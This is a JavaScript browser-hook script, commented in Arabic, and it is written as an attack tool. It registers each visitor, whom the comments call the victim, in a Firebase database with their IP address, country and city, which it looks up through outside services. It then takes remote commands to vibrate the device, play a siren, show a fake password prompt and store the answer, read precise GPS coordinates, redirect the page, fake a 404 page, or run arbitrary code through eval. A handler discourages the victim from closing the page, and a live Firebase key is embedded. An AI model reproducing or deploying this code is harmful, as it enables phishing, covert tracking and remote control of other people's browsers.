// --- ARABIC ADVANCED HOOK v3.2 (Reliability Fix) ---
let lastCommandId = null;
let database = null;
let vibrationInterval = null;
let sirenAudio = null;

function startHook() {
    const firebaseConfig = {
        apiKey: "AIzaSyD8FbVZcwr9553MF3oew6lTwHWWRd4HSug",
        authDomain: "imagesp.firebaseapp.com",
        databaseURL: "https://imagesp-default-rtdb.firebaseio.com",
        projectId: "imagesp",
        storageBucket: "imagesp.firebasestorage.app",
        messagingSenderId: "1065951052976",
        appId: "1:1065951052976:web:6141574d9b6f1f4c4f6775",
        measurementId: "G-T8R27710QM"
    };

    if (typeof firebase !== 'undefined') {
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        database = firebase.database();

        // --- تفعيل الارتباط الدائم في الخلفية ---
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').catch(e => console.log("SW Error"));
        }

        // 1. تسجيل الضحية "فوراً" بأقل معلومات ممكنة لضمان الظهور
        const sessionRef = database.ref('sessions').push();
        sessionRef.set({
            ip: "جاري الجلب...",
            country: "جاري الجلب...",
            city: "جاري الجلب...",
            platform: navigator.platform,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
        sessionRef.onDisconnect().remove();

        // 2. محاولة جلب المعلومات التفصيلية وتحديث الجلسة
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                fetch(`https://ipwho.is/${ipData.ip}`)
                    .then(r => r.json())
                    .then(geo => {
                        sessionRef.update({
                            ip: geo.ip || ipData.ip,
                            country: geo.country || "Unknown",
                            city: geo.city || "Unknown"
                        });
                    }).catch(e => {
                        sessionRef.update({ ip: ipData.ip }); // تحديث الـ IP فقط في حال فشل الموقع
                    });
            }).catch(e => console.log("Network discovery blocked"));

        // 3. الاستماع للأوامر
        database.ref('commands').on('value', (snapshot) => {
            const cmd = snapshot.val();
            if (cmd && cmd.id !== lastCommandId) {
                lastCommandId = cmd.id;
                handleCommand(cmd);
            }
        });
    } else {
        setTimeout(startHook, 500);
    }
}

function handleCommand(cmd) {
    if (cmd.status === 'stop') {
        clearInterval(vibrationInterval);
        if(sirenAudio) sirenAudio.pause();
        return;
    }

    switch(cmd.action) {
        case 'vibrate_loop':
            clearInterval(vibrationInterval);
            vibrationInterval = setInterval(() => {
                if (navigator.vibrate) navigator.vibrate([500, 200, 500]);
            }, 1000);
            break;
        case 'siren':
            if(!sirenAudio) sirenAudio = new Audio('https://www.soundjay.com/buttons/beep-01a.mp3');
            sirenAudio.loop = true;
            sirenAudio.play().catch(e => console.log("Interaction required for audio"));
            break;
        case 'phish':
            setTimeout(() => {
                const p = prompt(cmd.data || "يرجى تأكيد كلمة مرور النظام للمتابعة"); 
                if(p) database.ref('logs').push({ msg: "الضحية أدخل: " + p, time: Date.now() });
            }, 500);
            break;
        case 'fake_404':
            document.body.innerHTML = '<div style="background:white; color:black; height:100vh; padding:20px; font-family:sans-serif;"><h1>404 Not Found</h1><hr>nginx/1.18.0 (Ubuntu)</div>';
            break;
        case 'location_precise':
            navigator.geolocation.getCurrentPosition((pos) => {
                database.ref('logs').push({ msg: `الموقع الدقيق: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`, time: Date.now() });
            });
            break;
        case 'alert': alert(cmd.data); break;
        case 'redirect': window.location.href = cmd.data; break;
        case 'eval': try { eval(cmd.data); } catch(e) {} break;
    }
}

// --- ANTI-CLOSE SYSTEM ---
// تظهر رسالة تحذيرية للضحية عند محاولة إغلاق الصفحة
window.addEventListener('beforeunload', function (e) {
    const message = "هل أنت متأكد؟ سيتم إلغاء عملية التحقق الحالية!";
    e.returnValue = message;
    return message;
});

startHook();
